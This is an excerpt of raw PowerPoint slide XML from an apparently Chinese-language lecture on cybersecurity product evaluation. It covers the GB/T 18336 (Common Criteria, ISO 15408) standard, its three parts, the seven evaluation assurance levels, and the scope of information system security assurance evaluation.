                <a:spcPct val="125000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>目的</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>为产品认证提供证据，增强用户对已评估产品安全的信任，向消费者提供信息技术安全产品的采购依据，推动信息技术安全产业的发展、提高信息技术安全科研和生产水平。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87045" name="标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="727317"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全产品测评</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955277" y="3716822"/>
            <a:ext cx="5455340" cy="490519"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息产品安全测评依据的标准是：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>CC</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38686654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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="870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704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7043">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8704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70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P spid="2"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06994" y="3402223"/>
            <a:ext cx="5544616" cy="2677656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T 18336 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>国际标准 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>15408</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）中定义了以下</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>个评估保证级：</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(1)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1(EAL1)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>功能测试；</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(2)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2(EAL2)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>结构测试；</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(3)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3(EAL3)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>系统地测试和检查；</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(4)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4(EAL4)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>系统地设计、测试和复查；</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(5)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5(EAL5)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>半形式化设计和测试；</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(6)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6(EAL6)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>半形式化验证的设计和测试；</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(7)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7(EAL7)——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>形式化验证的设计和测试。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="图片 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5751610" y="1395549"/>
            <a:ext cx="3248259" cy="4722131"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="437615" y="764704"/>
            <a:ext cx="3464346" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T 18336</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>系列标准</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206994" y="1814522"/>
            <a:ext cx="6118647" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T18336《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>信息技术 安全技术 信息技术安全评估准则</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>分为以下三部分</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T18336.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>简介和一般模型</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T18336.2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>安全功能组件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T18336.3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>安全保障组件。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206994" y="1366557"/>
            <a:ext cx="5704657" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T 18336</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>国家标准 等同采用 国际标准 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>15408</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>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9256776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heel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="2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DC5EDF44-8AB7-44EA-8977-0DA03EE4BCD1}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>129</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92163" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622252" y="1557480"/>
            <a:ext cx="7648575" cy="2088703"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>在信息系统的生命周期内，根据组织机构的要求在信息系统的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全技术、安全管理和安全工程</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>领域内对信息系统的安全技术控制措施和技术架构能力、安全管理控制和管理能力以及安全工程实施控制措施和工程实施能力进行评估综合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92164" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="711236"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障评估的内容</a:t>
            </a:r>
          </a:p>
